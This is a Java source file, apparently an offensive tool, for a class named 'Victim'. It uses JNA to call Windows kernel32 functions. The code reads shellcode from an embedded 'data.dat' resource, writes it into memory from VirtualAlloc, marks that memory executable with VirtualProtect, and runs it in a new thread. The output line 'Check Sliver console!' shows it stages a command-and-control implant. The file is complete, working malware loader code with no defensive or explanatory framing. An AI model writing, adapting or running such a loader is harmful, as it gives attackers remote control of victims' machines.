package shell;

import com.sun.jna.Native;
import com.sun.jna.win32.StdCallLibrary;
import java.io.InputStream;

public class Victim {

    public interface Kernel32 extends StdCallLibrary {
        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class);
        long VirtualAlloc(long lpAddress, long dwSize, int flAllocationType, int flProtect);
        long CreateThread(long lpThreadAttributes, long dwStackSize, long lpStartAddress, long lpParameter, int dwCreationFlags, long lpThreadId);
        int WaitForSingleObject(long hHandle, int dwMilliseconds);
        boolean VirtualProtect(long lpAddress, long dwSize, int flNewProtect, com.sun.jna.ptr.IntByReference lpflOldProtect);
    }

    public static void main(String[] args) {
        try {
            System.out.println("[*] Extracting embedded payload...");
            InputStream is = Victim.class.getResourceAsStream("/data.dat");
            if (is == null) {
                System.out.println("[!] Error: data.dat not found in resources!");
                return;
            }
            byte[] shellcode = is.readAllBytes();
            System.out.println("[*] Payload size: " + shellcode.length + " bytes");

            // Windows Constants
            int MEM_COMMIT = 0x1000;
            int MEM_RESERVE = 0x2000;
            int PAGE_READWRITE = 0x04;
            int PAGE_EXECUTE_READ = 0x20;

            System.out.println("[*] Allocating memory...");
            long address = Kernel32.INSTANCE.VirtualAlloc(0, shellcode.length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            System.out.println("[*] Writing payload to memory...");
            com.sun.jna.Pointer pointer = new com.sun.jna.Pointer(address);
            pointer.write(0, shellcode, 0, shellcode.length);

            System.out.println("[*] Setting memory to executable...");
            com.sun.jna.ptr.IntByReference oldProtect = new com.sun.jna.ptr.IntByReference();
            Kernel32.INSTANCE.VirtualProtect(address, shellcode.length, PAGE_EXECUTE_READ, oldProtect);

            System.out.println("[*] Executing thread. Check Sliver console!");
            long threadHandle = Kernel32.INSTANCE.CreateThread(0, 0, address, 0, 0, 0);

            Kernel32.INSTANCE.WaitForSingleObject(threadHandle, -1);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
